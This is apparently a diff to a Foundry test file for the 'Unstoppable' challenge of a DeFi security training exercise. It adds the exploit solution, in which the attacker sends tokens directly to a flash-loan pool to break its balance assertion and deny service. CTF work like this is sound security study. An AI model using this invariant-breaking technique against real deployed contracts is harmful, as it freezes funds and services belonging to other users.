@@ -10,7 +10,7 @@ import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUn
 
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
-    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
+    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 10e18;
 
     Utilities internal utils;
     UnstoppableLender internal unstoppableLender;
@@ -56,10 +56,15 @@ contract Unstoppable is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testUnstoppableExploit() public {
         /**
          * EXPLOIT START *
          */
+        vm.prank(attacker);
+        // Getting extra dvt tokens into the unstoppableLender contract breaks the assertion in flashLoan()
+        dvt.transfer(address(unstoppableLender), 10e18);
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
